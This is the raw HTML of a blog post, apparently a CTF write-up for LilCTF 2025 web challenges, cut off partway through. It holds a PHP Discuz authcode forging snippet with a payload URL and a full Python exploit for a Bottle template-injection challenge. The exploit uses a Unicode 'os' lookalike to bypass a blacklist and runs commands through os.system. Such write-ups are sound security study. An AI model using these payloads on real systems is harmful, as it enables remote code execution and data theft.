$rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u003c 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u003c $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() \u003e 0) \u0026\u0026 substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } $UC_KEY = \"N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb\"; $tmp = \"time=\".time().\"\u0026method=export\"; $code = urlencode(_authcode($tmp, 'ENCODE', $UC_KEY)); print($code); ?\u003e payloadï¼š\nhttp://challenge.xinshi.fun:43672/api/db/dbbak.php?apptype=discuzx\u0026code=7e6boiAfroxp9Fuy7oIpRV3cXkVfPwg9zOKPJNuyuUTlr3UsJzuwez0yqdCPZmRqTPp6RVSTsKUL3w ç½‘é¡µå›æ˜¾ï¼š\n",
  "wordCount" : "5322",
  "inLanguage": "en",
  "datePublished": "2025-08-17T00:00:00Z",
  "dateModified": "2025-08-28T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/ctf/lilctf-2025-web-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="æ–‡ç« ">
                    <span>æ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      LilCTF 2025 WEB Writeup
    </h1>
    <div class="post-meta"><span title='2025-08-17 00:00:00 +0000 UTC'>August 17, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#ez_bottle" aria-label="ez_bottle">ez_bottle</a></li>
                    <li>
                        <a href="#ekko_note" aria-label="Ekko_note">Ekko_note</a></li>
                    <li>
                        <a href="#your-uns3r" aria-label="Your Uns3r">Your Uns3r</a></li>
                    <li>
                        <a href="#%e6%88%91%e6%9b%be%e6%9c%89%e4%b8%80%e4%bb%bd%e5%b7%a5%e4%bd%9c" aria-label="æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ">æˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ</a></li>
                    <li>
                        <a href="#php_jail_is_my_cry" aria-label="php_jail_is_my_cry">php_jail_is_my_cry</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="ez_bottle">ez_bottle<a hidden class="anchor" aria-hidden="true" href="#ez_bottle">#</a></h2>
<p>é™„ä»¶ç»™äº†æºç ï¼Œweb-ez-bottle.pyï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> bottle <span style="color:#f92672">import</span> route, run, template, post, request, static_file, error
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hint: flag in /flag , have a try</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>UPLOAD_DIR <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__), <span style="color:#e6db74">&#39;uploads&#39;</span>)
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>makedirs(UPLOAD_DIR, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>STATIC_DIR <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__), <span style="color:#e6db74">&#39;static&#39;</span>)
</span></span><span style="display:flex;"><span>MAX_FILE_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BLACK_DICT <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;os&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;sock&#34;</span>, <span style="color:#e6db74">&#34;&lt;&#34;</span>, <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;bul&#34;</span>, <span style="color:#e6db74">&#34;class&#34;</span>, <span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;bash&#34;</span>, <span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;globals&#34;</span>,
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">&#34;get&#34;</span>, <span style="color:#e6db74">&#34;open&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">contains_blacklist</span>(content):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> any(black <span style="color:#f92672">in</span> content <span style="color:#66d9ef">for</span> black <span style="color:#f92672">in</span> BLACK_DICT)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_symlink</span>(zipinfo):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (zipinfo<span style="color:#f92672">.</span>external_attr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0o170000</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0o120000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_safe_path</span>(base_dir, target_path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(target_path)<span style="color:#f92672">.</span>startswith(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(base_dir))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> static_file(<span style="color:#e6db74">&#39;index.html&#39;</span>, root<span style="color:#f92672">=</span>STATIC_DIR)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#39;/static/&lt;filename&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">server_static</span>(filename):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> static_file(filename, root<span style="color:#f92672">=</span>STATIC_DIR)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#39;/upload&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_page</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> static_file(<span style="color:#e6db74">&#39;upload.html&#39;</span>, root<span style="color:#f92672">=</span>STATIC_DIR)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@post</span>(<span style="color:#e6db74">&#39;/upload&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
</span></span><span style="display:flex;"><span>    zip_file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;file&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> zip_file <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> zip_file<span style="color:#f92672">.</span>filename<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#39;.zip&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Invalid file. Please upload a ZIP file.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(zip_file<span style="color:#f92672">.</span>file<span style="color:#f92672">.</span>read()) <span style="color:#f92672">&gt;</span> MAX_FILE_SIZE:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    zip_file<span style="color:#f92672">.</span>file<span style="color:#f92672">.</span>seek(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    current_time <span style="color:#f92672">=</span> str(time<span style="color:#f92672">.</span>time())
</span></span><span style="display:flex;"><span>    unique_string <span style="color:#f92672">=</span> zip_file<span style="color:#f92672">.</span>filename <span style="color:#f92672">+</span> current_time
</span></span><span style="display:flex;"><span>    md5_hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(unique_string<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    extract_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_DIR, md5_hash)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>makedirs(extract_dir)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    zip_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(extract_dir, <span style="color:#e6db74">&#39;upload.zip&#39;</span>)
</span></span><span style="display:flex;"><span>    zip_file<span style="color:#f92672">.</span>save(zip_path)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(zip_path, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> z:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> file_info <span style="color:#f92672">in</span> z<span style="color:#f92672">.</span>infolist():
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> is_symlink(file_info):
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Symbolic links are not allowed.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                real_dest_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(extract_dir, file_info<span style="color:#f92672">.</span>filename))
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_safe_path(extract_dir, real_dest_path):
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Path traversal detected.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            z<span style="color:#f92672">.</span>extractall(extract_dir)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> zipfile<span style="color:#f92672">.</span>BadZipFile:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Invalid ZIP file.&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(extract_dir)
</span></span><span style="display:flex;"><span>    files<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;upload.zip&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> template(<span style="color:#e6db74">&#34;æ–‡ä»¶åˆ—è¡¨: {{files}}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">è®¿é—®: /view/{{md5}}/{{first_file}}&#34;</span>,
</span></span><span style="display:flex;"><span>                    files<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>join(files), md5<span style="color:#f92672">=</span>md5_hash, first_file<span style="color:#f92672">=</span>files[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">if</span> files <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;nofile&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@route</span>(<span style="color:#e6db74">&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_file</span>(md5, filename):
</span></span><span style="display:flex;"><span>    file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_DIR, md5, filename)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(file_path):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;File not found.&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;r&#39;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> contains_blacklist(content):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;you are hacker!!!nonono!!!&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> template(content)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error rendering template: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@error</span>(<span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">error404</span>(error):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;bbbbbboooottle&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@error</span>(<span style="color:#ae81ff">403</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">error403</span>(error):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Forbidden: You don&#39;t have permission to access this resource.&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>pythonçš„bottleæ¡†æ¶ï¼Œå®ç°äº†ä¸Šä¼ zipå‹ç¼©åŒ…å¹¶è§£å‹åˆ°æŒ‡å®šç›®å½•çš„åŠŸèƒ½ï¼ŒåŒæ—¶æœ‰å¯¹å†…å®¹çš„è¿‡æ»¤ï¼Œå¯ä»¥å‘ç°è¿‡æ»¤äº†å¸¸ç”¨çš„æ³¨å…¥æ¨¡æ¿<code>{{}} &lt;%%&gt;</code>ä»¥åŠå¸¸è§çš„osç­‰å…³é”®å­—ï¼Œbottleæ¡†æ¶è¿˜å¯ä»¥ä½¿ç”¨å•ä¸ªç™¾åˆ†å·æ¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œä½†æ˜¯ä¸ä¼šå°†å†…å®¹æ¸²æŸ“åˆ°ç½‘é¡µã€‚ç»“åˆ/staticè·¯ç”±å¯ä»¥è¯»å–staticç›®å½•ä¸‹é™æ€æ–‡ä»¶çš„ç‰¹æ€§ï¼Œè€ƒè™‘å°†/flagæ–‡ä»¶å¤åˆ¶åˆ°staticç›®å½•ä¸­ï¼ŒæœŸæœ›æ‰§è¡Œçš„å‘½ä»¤ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cp /flag ./static/flag.txt
</span></span></code></pre></div><p>ä¸€å¼€å§‹è€ƒè™‘é€šè¿‡æ–œä½“å­—ç¬¦æ¥ç»•è¿‡oå’Œaï¼Œå¤šæ¬¡å°è¯•ä¹‹åæ‰å‘ç°æ‰“å¼€æ–‡ä»¶çš„ç¼–ç æ–¹å¼æ˜¯utf-8ï¼Œæ–œä½“å­—ç¬¦ä¼šè¢«è§£ææˆç”Ÿåƒ»æ±‰å­—ï¼Œè€ƒè™‘å¾€UnicodeéASCIIå­—ç¬¦æ–¹å‘èµ°ï¼Œç¼–å†™æ¶æ„æ–‡ä»¶å†…å®¹è¦æ³¨æ„å¼€å¤´éœ€è¦æœ‰ä¸ªå›è½¦ç¬¦ï¼Œå¦åˆ™%åçš„å†…å®¹ä¸ä¼šè¢«å½“ä½œpythonå‘½ä»¤æ‰§è¡Œï¼š</p>
<pre tabindex="0"><code>

% from bottle import request
% import ğ¨s
% ğ¨s.system(request.query.v1)
</code></pre><p>å®Œæ•´exp:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> unquote
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://challenge.xinshi.fun:46226/upload&#34;</span>
</span></span><span style="display:flex;"><span>file_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./file.zip&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> unquote(<span style="color:#e6db74">&#34;%0A&#34;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;% &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;from bottle import request</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;% &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;import ğ¨s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;% &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;ğ¨s.system(request.query.v1)&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;file.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f: 
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> zipfile<span style="color:#f92672">.</span>ZipFile(<span style="color:#e6db74">&#34;file.zip&#34;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED) <span style="color:#66d9ef">as</span> zip:
</span></span><span style="display:flex;"><span>    zip<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;file.txt&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: (file_path, f, <span style="color:#e6db74">&#39;application/zip&#39;</span>)}
</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, files<span style="color:#f92672">=</span>files)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)  <span style="color:#75715e"># è¾“å‡ºæœåŠ¡å™¨è¿”å›çš„ç»“æœ</span>
</span></span></code></pre></div><p>å†å»è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¸¦ä¸Šv1ä¼ å‚è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š</p>
<pre tabindex="0"><code>http://challenge.xinshi.fun:46226/view/33fb755cb11889d8398700b6238f5375/file.txt?v1=cp%20/flag%20./static/flag.txt
</code></pre><p>åšå®Œä¹‹åå‘ç°æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤flagå­—ç¬¦ï¼Œæ ¹æœ¬ç”¨ä¸ç€å¯¼å…¥bottleä¸­çš„requestï¼Œ<code>request.query.v1</code>ç±»ä¼¼flaskä¸­çš„<code>request.args.v1</code>ï¼š</p>
<pre tabindex="0"><code>

% import ğ¨s
% ğ¨s.system(&#39;cp /flag ./static/flag.txt&#39;)
</code></pre><p>æœ€åè®¿é—®staticç›®å½•ä¸­çš„flag.txtå³å¯æ‹¿åˆ°flagï¼šLILCTF{6oT7IE_has_6eeN_recyc13d}</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://xz.aliyun.com/news/17718">https://xz.aliyun.com/news/17718</a></p>
<p><a href="https://www.osgeo.cn/bottle/api.html#the-request-object">https://www.osgeo.cn/bottle/api.html#the-request-object</a></p>
<hr>
<h2 id="ekko_note">Ekko_note<a hidden class="anchor" aria-hidden="true" href="#ekko_note">#</a></h2>
<p>é¢˜ç›®ç»™äº†æºç ï¼Œweb-ekko_exec.pyï¼š</p>
